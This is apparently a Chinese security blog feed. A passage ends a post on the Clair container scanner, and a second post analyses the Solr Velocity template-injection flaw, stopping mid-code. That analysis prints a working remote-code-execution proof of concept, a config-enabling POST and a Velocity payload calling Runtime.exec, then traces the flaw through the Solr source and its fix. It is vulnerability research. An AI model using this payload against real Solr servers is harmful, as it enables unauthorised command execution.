-v <span class="variable">$PWD</span>/clair_config:/config quay.io/coreos/clair:latest -config=/config/config.yaml <span class="comment"># 选择稳定的版本</span></span><br></pre></td></tr></table></figure><p>验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET -I http://<span class="variable">$&#123;docker-host&#125;</span>:6061/health</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: clair</span><br><span class="line">Date: Sat, 16 Nov 2019 12:39:46 GMT</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>如果是第一次启动需要同步数据库，如果在国内需要等待更长时间，更新完毕后可以看到如下输出：</p><p><img src="/container-Clair初探/image-20191117195355945.png" alt="image-20191117195355945"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>刚刚启动的Clair只是一个API Server，具体API可以参考 <a href="https://app.swaggerhub.com/apis/coreos/clair/3.0" target="_blank" rel="noopener">https://app.swaggerhub.com/apis/coreos/clair/3.0</a> ，要使用它扫描<strong>本地容器</strong>可以使用<a href="https://github.com/coreos/analyze-local-images" target="_blank" rel="noopener">analyze-local-images</a>，然而Clair认为扫描本地容器不是值得提倡的实践，因此这个项目就被废弃掉了（其原理是本地启动一个dockerhub服务，但是由于docker版本问题如今已无法使用），但是类似的Client还有很多，在 <a href="https://github.com/quay/clair/blob/master/Documentation/integrations.md" target="_blank" rel="noopener">https://github.com/quay/clair/blob/master/Documentation/integrations.md</a> 上可以看到，比如<a href="https://github.com/yebinama/paclair" target="_blank" rel="noopener">paclair</a>，它允许我们将公有/私有docker仓库中的镜像上传到clair扫描，下面就以它为例，说明Clair使用方法。</p><p>安装paclair很简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paclair</span><br></pre></td></tr></table></figure><p>接下来需要创建paclair配置（GitHub上还有其他仓库的配置）：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">General:</span></span><br><span class="line">  <span class="attr">clair_url:</span> <span class="string">'http://docker.test:6060'</span></span><br><span class="line"><span class="attr">Plugins:</span></span><br><span class="line">  <span class="attr">Docker:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">paclair.plugins.docker_plugin.DockerPlugin</span></span><br><span class="line">    <span class="attr">registries:</span></span><br><span class="line">      <span class="attr">hub.docker.com:</span></span><br><span class="line">        <span class="attr">auth:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"anemone95"</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"***"</span></span><br></pre></td></tr></table></figure><p>假设配置文件保存为<code>paclair.yml</code>，接下来使用如下命令上传docker并启动扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> push <span class="comment"># 将dockerhub上的镜像上传到Clair</span></span><br><span class="line">paclair --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> analyse --output-format html 2&gt;result.html <span class="comment"># 扫描产生html的报告</span></span><br><span class="line">paclair --conf conf/conf.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> delete <span class="comment"># 删除容器</span></span><br></pre></td></tr></table></figure></p><p>产生的报告如下(test上的容器实际上是<code>medicean/vulapps:s_struts2_s2-037</code>：</p><p><img src="/container-Clair初探/image-20191117172303850.png" alt="image-20191117172303850"></p><p>struts2没找到漏洞，换个ssh(CVE-2017-1000117)看看，这回我们导出json格式的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker medicean/vulapps:s_ssh_1 push</span><br><span class="line">paclair --conf paclair.yml Docker medicean/vulapps:s_ssh_1 analyse 2&gt;ssh.json</span><br></pre></td></tr></table></figure><p>这样就找到了：</p><p><img src="/container-Clair初探/image-20191124155822590.png" alt="image-20191124155822590"></p><h1 id="报告分析"><a href="#报告分析" class="headerlink" title="报告分析"></a>报告分析</h1><p>可以看到图片上，报告中展示了容器中使用的第三方组件，如gcc， unzip，openssl，并且给出了安全等级，当前版本和修复版本，但是也可以看到其不足：</p><ul><li>对应用组件的检测能力不足，如测试镜像的主要问题在于低版本struts，但是其没有检测到</li><li>只是简单对比其组件hash，而没有更深入的检测，如即使是使用了gcc，但是容器暴漏在外部的部分并没有用，那么实际上攻击者是无法利用的；又比如空密码的redis，使用hash比较是没法测出来的。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Clair是一款用来扫描容器中使用第三方不安全组件的工具，能够将容器分层扫描，匹配CVE，Ubuntu，Redhat等多个数据库，个人感觉有以下优缺点：</p><p>优点：</p><ul><li>开源核心模块，方便二次开发</li></ul><p>缺点：</p><ul><li>Client使用复杂，官方给出的client——analyze-local-images已经停止维护，更强大的client需要付费使用，而其他第三方的client不一定能持续维护</li><li>文档不全，GitHub主页的quickstart都有坑，而且更多配置没有说明</li><li>对应用组件的检测能力不足</li><li>检测逻辑简单，存在漏报和误报</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Clair简介&quot;&gt;&lt;a href=&quot;#Clair简介&quot; class=&quot;headerlink&quot; title=&quot;Clair简介&quot;&gt;&lt;/a&gt;Clair简介&lt;/h1&gt;&lt;p&gt;clair是CoreOS公司开源的一套针对容器安全性检测工具，主要用于发掘容器中使用的组件是否存在安全性问题。&lt;/p&gt;&lt;p&gt;GitHub项目地址： &lt;a href=&quot;https://github.com/quay/clair&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/quay/clair&lt;/a&gt; &lt;/p&gt;&lt;h1 id=&quot;Clair-Framework&quot;&gt;&lt;a href=&quot;#Clair-Framework&quot; class=&quot;headerlink&quot; title=&quot;Clair Framework&quot;&gt;&lt;/a&gt;Clair Framework&lt;/h1&gt;&lt;h2 id=&quot;术语&quot;&gt;&lt;a href=&quot;#术语&quot; class=&quot;headerlink&quot; title=&quot;术语&quot;&gt;&lt;/a&gt;术语&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Ancestry——表示容器&lt;/li&gt;
&lt;li&gt;Feature——容器中任何具有脆弱性的实体，如软件包和文件&lt;/li&gt;
&lt;li&gt;Feature Namespace——Feature所在的上下文，如操作系统和编程语言&lt;/li&gt;
&lt;li&gt;Vulnerability Source——Clair中用来跟踪上有漏洞数据库（如CVE）的组件&lt;/li&gt;
&lt;li&gt;Vulnerability Metadata Source——漏洞元数据，用来关联上游漏洞数据和Clair数据库&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="container" scheme="http://anemone.top/categories/container/"/>
    
    
      <category term="容器安全" scheme="http://anemone.top/tags/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="docker" scheme="http://anemone.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Solr Velocity模板注入漏洞分析</title>
    <link href="http://anemone.top/vulnresearch-Solr_Velocity_injection/"/>
    <id>http://anemone.top/vulnresearch-Solr_Velocity_injection/</id>
    <published>2019-11-03T12:30:49.000Z</published>
    <updated>2019-12-08T12:57:03.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png" alt="image-20191124205421987"></p><p>同样的方法启动项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0</span><br><span class="line">$ <span class="built_in">cd</span> server/ <span class="comment">#一定要在server下运行</span></span><br><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --module=http</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="0x00-检查core是否允许velocity"><a href="#0x00-检查core是否允许velocity" class="headerlink" title="0x00  检查core是否允许velocity"></a>0x00  检查core是否允许velocity</h2><p>检查<code>{core}/conf/solrconfig.xml</code>中是否允许solr.VelocityResponseWriter，具体来说，检查是否有如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 一定要加依赖，否则会报错400，找不到velocity类 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/contrib/velocity/lib"</span> <span class="attr">regex</span>=<span class="string">".*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/dist/"</span> <span class="attr">regex</span>=<span class="string">"solr-velocity-\d.*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 开启velocityResponse --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queryResponseWriter</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"solr.VelocityResponseWriter"</span> <span class="attr">startup</span>=<span class="string">"lazy"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"template.base.dir"</span>&gt;</span>$&#123;velocity.template.base.dir:&#125;<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queryResponseWriter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果没有需要加上，并且重启solr</p><h2 id="0x01-设置params-resource-loader-enabled-true"><a href="#0x01-设置params-resource-loader-enabled-true" class="headerlink" title="0x01 设置params.resource.loader.enabled=true"></a>0x01 设置params.resource.loader.enabled=true</h2><p>设置VelocityResponseWriter插件的params.resource.loader.enabled选项设置为true，即允许在Solr请求参数中允许模板：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务返回200并且观察到<code>${solr_home}/example/example-DIH/solr/tika/conf</code>下出现<code>configoverlay.json</code>表示设置成功。</p><h2 id="0x02-通过Velocity模板注入进行RCE"><a href="#0x02-通过Velocity模板注入进行RCE" class="headerlink" title="0x02 通过Velocity模板注入进行RCE"></a>0x02 通过Velocity模板注入进行RCE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/tika/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost.com:8983</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回包中看到命令执行结果：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124164155298.png" alt="image-20191124164155298"></p><h3 id="Velocity-RCE方法"><a href="#Velocity-RCE方法" class="headerlink" title="Velocity RCE方法"></a>Velocity RCE方法</h3><p>urldecode一下，可以看到velocity进行RCE的payload，留着以后可能有用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;) </span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;)) </span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;)) </span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;)) </span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))+$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream()) </span><br><span class="line">#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Solr&lt;=8.2.0 且core允许velocity模板。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="solr-core-config"><a href="#solr-core-config" class="headerlink" title="/solr/{core}/config"></a>/solr/{core}/config</h2><p>还是跟上次一样，断点下在org.apache.solr.servlet.HttpSolrCall#call:519这里，调试第一个请求，还是通过如下调用栈，交给handler处理请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.servlet.HttpSolrCall#call:542</span><br><span class="line">  org.apache.solr.servlet.HttpSolrCall#execute():756</span><br><span class="line">    org.apache.solr.core.SolrCore#execute:2566</span><br><span class="line">      org.apache.solr.request.SolrRequestHandler#handleRequest:199</span><br><span class="line">        org.apache.solr.handler.SolrConfigHandler#handleRequestBody</span><br></pre></td></tr></table></figure><p>可以看到，这此处理的handler是SolrConfigHandler，其将接受的post参数创建为command对象（129行），然后调用它的handlePOST()方法：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175443383.png" alt="image-20191124175443383"></p><p>handlePOST()方法如下，其获取command的操作，以及需要覆盖的原配置，调Command#handleCommands：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175720679.png" alt="image-20191124175720679"></p><p>Command#handleCommands(ops, overlay)，其是一个switch-case结构，这里走的是默认分支，然后调用Command#updateNamedPlugin更新之前的配置（overlay变量），再将配置保存到zk或者本地：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleCommands</span><span class="params">(List&lt;CommandOperation&gt; ops, ConfigOverlay overlay)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (CommandOperation op : ops) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (op.name) &#123;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">default</span>: &#123;</span><br><span class="line">          List&lt;String&gt; pcs = StrUtils.splitSmart(op.name.toLowerCase(Locale.ROOT), <span class="string">'-'</span>);</span><br><span class="line">          <span class="keyword">if</span> (pcs.size() != <span class="number">2</span>) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String prefix = pcs.get(<span class="number">0</span>);</span><br><span class="line">            String name = pcs.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmdPrefixes.contains(prefix) &amp;&amp; namedPlugins.containsKey(name)) &#123;</span><br><span class="line">              SolrConfig.SolrPluginInfo info = namedPlugins.get(name);</span><br><span class="line">              <span class="keyword">if</span> (<span class="string">"delete"</span>.equals(prefix)) &#123;</span><br><span class="line">                overlay = deleteNamedComponent(op, overlay, info.getCleanTag());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                overlay = updateNamedPlugin(info, op, overlay, prefix.equals(<span class="string">"create"</span>) || prefix.equals(<span class="string">"add"</span>)); <span class="comment">//这里更新配置（overlay变量）</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              op.unknownOperation();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List errs = CommandOperation.captureErrors(ops);</span><br><span class="line">    <span class="keyword">if</span> (!errs.isEmpty()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">    <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> ZkSolrResourceLoader) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      SolrResourceLoader.persistConfLocally(loader, ConfigOverlay.RESOURCE_NAME, overlay.toByteArray()); <span class="comment">// 将配置保存到本地</span></span><br><span class="line">      req.getCore().getCoreContainer().reload(req.getCore().getName()); <span class="comment">// 更新配置</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>28行（实际代码504行）会将配置保存到本地，也就是<code>{core}/conf/configoverlay.json</code>文件了。</p><p>那么总结一下调用栈就是：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124181632402.png" alt="image-20191124181632402"></p><h2 id="solr-core-select"><a href="#solr-core-select" class="headerlink" title="/solr/{core}/select"></a>/solr/{core}/select</h2><p> 这个API原先应该是数据库查询用的，但现在由于允许了执行参数中指定的velocity，造成了SSTI，我们重新看一下org.apache.solr.servlet.HttpSolrCall#call方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();<span class="comment">//VelocityResopnseWriter</span></span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod); <span class="comment">//SSTI</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) <span class="comment">/*...*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引发SSTI的关键在于第26行（源程序第556行），其调用了HttpSolrCall#getResponseWriter，获取到VelocityResponseWriter，和30行（源程序558行），其会通过HttpSolrCall#writeResponse将Request中参数渲染到页面。</p><p>先看HttpSolrCall#getResponseWriter：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184425485.png" alt="image-20191124184425485"></p><p>逻辑很简单，就是从参数<code>wt</code>中获取模板，然后返回对应模板——注意到PoC中的<code>wt=velocity</code></p><p>再看HttpSolrCall#writeResponse：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184911792.png" alt="image-20191124184911792"></p><p>其调用了QueryResponseWriterUtil#writeQueryResponse()，将solrReq，solrRsp写成HTTP Response，ct是content-type。</p><p>HttpSolrCall#writeResponse()调用QueryResponseWriterUtil#writeQueryResponse()，先生产一个OutputStreamWriter，然后用responseWriter写入内容：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124185248960.png" alt="image-20191124185248960"></p><p>再跟进去就到了VelocityResponseWriter#write：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124190358485.png" alt="image-20191124190358485"></p><h3 id="VelocityResponseWriter-createEngine"><a href="#VelocityResponseWriter-createEngine" class="headerlink" title="VelocityResponseWriter#createEngine"></a>VelocityResponseWriter#createEngine</h3><p>在VelocityResponseWriter#createEngine中，如果<code>paramsResourceLoaderEnabled</code>，那么<code>params.resource.loader.instance=new SolrParamResourceLoader(request)</code>，如果<code>solrResourceLoaderEnabled</code>，那么<code>solr.resource.loader.instance=solrResourceLader</code></p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124210507568.png" alt="image-20191124210507568"></p><p>先看第一个if——<code>SolrParamResourceLoader(request)</code>这个构造函数，其会将请求中的<code>v.template</code>开头的参数名截取剩下的部分+“.vm”作为key——注意到PoC中的<code>v.template.custom=%23set($x=%27%27)...</code>，截取后得到<code>custom</code>+<code>.vm</code>=<code>custom.vm</code>，而请求中参数内容作为template，因此由于这个而参数时攻击者可以控制的——例如在PoC中，将内容设置为了<code>%23set($x=%27%27)...</code>，因此造成SSTI：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124211628918.png" alt="image-20191124211628918"></p><p>再看第二个if——<code>SolrVelocityResourceLoader()</code>其任务是加载一个有velocity classpath的ResourceLoader：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124212157913.png" alt="image-20191124212157913"></p><h3 id="VelocityResponseWriter-getTemplate"><a href="#VelocityResponseWriter-getTemplate" class="headerlink" title="VelocityResponseWriter#getTemplate"></a>VelocityResponseWriter#getTemplate</h3><p>回到VelocityResponseWriter#write，在VelocityResponseWriter#getTemplate时，会从请求v.template参数中获取模板的名称，即PoC中的<code>v.template=custom</code>，再走到<code>engine.getTemplate(templateName + TEMPLATE_EXTENSION)</code>获取template，即前面设置的<code>custom.vm</code>：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205548129.png" alt="image-20191124205548129"></p><p>模板解释发生在<code>org.apache.velocity.Template#merge(Context, Writer)</code>，后面就是Velocity模板解释逻辑了，不再跟。</p><p>总结一下调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">558</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">writeResponse:<span class="number">849</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">  writeQueryResponse:<span class="number">65</span>, QueryResponseWriterUtil (org.apache.solr.response)</span><br><span class="line">    write:<span class="number">150</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      createEngine:<span class="number">313</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">        SolrParamResourceLoader()<span class="comment">//设置params.resource.loader——custom.vm模板</span></span><br><span class="line">      createEngine:<span class="number">324</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">//设置solr.resource.loader——加载velocity lib</span></span><br><span class="line">    write:<span class="number">152</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      getTemplate:<span class="number">372</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">// 获取模板</span></span><br><span class="line">    write:<span class="number">166</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      merge:<span class="number">264</span>, Template (org.apache.velocity) <span class="comment">// 模板渲染，RCE</span></span><br><span class="line">        merge:<span class="number">359</span>, Template (org.apache.velocity)</span><br><span class="line">          render:<span class="number">376</span>, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure><h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>下载v8.3.1的solr，发送PoC后可以看到报错了：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208165035876.png" alt="image-20191208165035876"></p><p>从报错内容上看，solr没获取到custom.vm模板，那再参考之前分析，应该是VelocityResponseWriter#createEngine做了修改，但是调试后发现这里并没修改，只是两个if判断都为false了，paramsResourceLoaderEnabled和solrResourceLoaderEnabled都是false：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208172313550.png" alt="image-20191208172313550"></p><p>经过调试，可以找到VelocityResponseWriter的构造调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 